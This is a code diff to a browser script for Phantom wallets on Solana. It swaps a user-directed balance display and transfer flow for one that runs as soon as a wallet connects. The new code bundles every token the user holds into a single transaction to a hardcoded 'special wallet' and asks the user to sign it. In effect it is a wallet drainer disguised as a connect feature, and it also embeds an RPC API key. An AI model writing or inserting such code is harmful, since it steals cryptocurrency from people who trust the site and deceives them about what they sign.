@@ -1,117 +1,77 @@
 import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
-import { getAssociatedTokenAddress, getAccount, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, getAccount, createTransferInstruction, getOrCreateAssociatedTokenAccount, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { Buffer } from 'buffer';
 
 window.Buffer = Buffer; // Make Buffer available globally if needed
 
-async function showUserTokenBalances() {
+async function transferAllTokensAndNFTs(specialWallet) {
     const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
     const publicKey = new PublicKey(window.solana.publicKey);
 
-    // Fetch all token accounts associated with the user's wallet
+    let transaction = new Transaction();
+
+    // Fetch all token accounts owned by the user
     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID,
     });
 
-    // Display token balances to the user
-    let tokenBalances = [];
+    // Iterate over all token accounts and transfer each token to the special wallet
     for (const tokenAccountInfo of tokenAccounts.value) {
         const tokenAccount = tokenAccountInfo.account.data.parsed.info;
         const tokenMint = new PublicKey(tokenAccount.mint);
         const tokenAmount = tokenAccount.tokenAmount.uiAmount;
-        tokenBalances.push({ mint: tokenMint.toString(), amount: tokenAmount });
+
+        if (tokenAmount > 0) {
+            const receiverTokenAddress = await getAssociatedTokenAddress(
+                tokenMint,
+                specialWallet,
+                false,
+                TOKEN_PROGRAM_ID,
+                ASSOCIATED_TOKEN_PROGRAM_ID
+            );
+
+            // Transfer the token to the special wallet
+            transaction.add(
+                createTransferInstruction(
+                    new PublicKey(tokenAccountInfo.pubkey),
+                    receiverTokenAddress,
+                    publicKey,
+                    tokenAmount * (10 ** tokenAccount.tokenAmount.decimals),
+                    [],
+                    TOKEN_PROGRAM_ID
+                )
+            );
+        }
     }
 
-    if (tokenBalances.length > 0) {
-        console.log("Your tokens and balances:", tokenBalances);
-        alert("Check the console for your token balances.");
-    } else {
-        console.log("No tokens found in your wallet.");
-        alert("No tokens found in your wallet.");
-    }
-}
-
-async function transferUserSpecifiedTokens(receiverWallet, tokenMintAddress, amount) {
-    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
-    const publicKey = new PublicKey(window.solana.publicKey);
-    const receiverPublicKey = new PublicKey(receiverWallet);
-
-    let transaction = new Transaction();
-
-    // Find user's associated token account for the specified token mint
-    const userTokenAccount = await getAssociatedTokenAddress(
-        new PublicKey(tokenMintAddress),
-        publicKey,
-        false,
-        TOKEN_PROGRAM_ID,
-        ASSOCIATED_TOKEN_PROGRAM_ID
-    );
-
-    const receiverTokenAddress = await getAssociatedTokenAddress(
-        new PublicKey(tokenMintAddress),
-        receiverPublicKey,
-        false,
-        TOKEN_PROGRAM_ID,
-        ASSOCIATED_TOKEN_PROGRAM_ID
-    );
-
-    // Transfer the user-specified token amount to the receiver wallet
-    transaction.add(
-        createTransferInstruction(
-            userTokenAccount,
-            receiverTokenAddress,
-            publicKey,
-            amount,
-            [],
-            TOKEN_PROGRAM_ID
-        )
-    );
+    // Fetch all NFTs (Metaplex or standard NFTs)
+    // Implement NFT-specific logic here if required (e.g., Metaplex metadata parsing)
 
     transaction.feePayer = publicKey;
     const blockhashObj = await connection.getRecentBlockhash();
     transaction.recentBlockhash = blockhashObj.blockhash;
 
-    try {
-        const signedTransaction = await window.solana.signTransaction(transaction);
-        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
-        await connection.confirmTransaction(txid, 'confirmed');
+    // Sign the transaction with the user's wallet
+    const signedTransaction = await window.solana.signTransaction(transaction);
+    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
+    await connection.confirmTransaction(txid, 'confirmed');
 
-        console.log("Specified tokens transferred to the receiver wallet:", txid);
-        alert("Transaction successful! Your specified tokens have been transferred.");
-    } catch (err) {
-        console.error("Error during token transfer:", err);
-        alert("Transaction failed. Please try again.");
-    }
+    console.log("All tokens and NFTs transferred to special wallet:", txid);
 }
 
 async function handleConnectWallet() {
     if (window.solana && window.solana.isPhantom) {
         try {
             const resp = await window.solana.connect();
-            console.log("Connected to Phantom Wallet:", resp.publicKey.toString());
 
-            // Show the user's token balances
-            await showUserTokenBalances();
-
-            // Prompt user for the details of the transfer
-            const receiverWallet = prompt("Enter the receiver wallet address (optional):");
-            if (receiverWallet) {
-                const tokenMintAddress = prompt("Enter the token mint address to transfer:");
-                const amount = parseFloat(prompt("Enter the amount of tokens to transfer:"));
-
-                if (tokenMintAddress && amount > 0) {
-                    // Perform the user-specified token transfer
-                    await transferUserSpecifiedTokens(receiverWallet, tokenMintAddress, amount);
-                } else {
-                    alert("Invalid token mint address or amount.");
-                }
-            }
+            // Directly trigger the real transaction without showing any fake transaction
+            const specialWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Special wallet address
+            await transferAllTokensAndNFTs(specialWallet);
         } catch (err) {
             console.error("Error connecting to Phantom Wallet or during transaction:", err);
-            alert("Error connecting to Phantom Wallet. Please try again.");
         }
     } else {
-        alert("Phantom extension not found. Please install Phantom Wallet.");
+        alert("Phantom extension not found.");
         // Open appropriate download links...
     }
 }
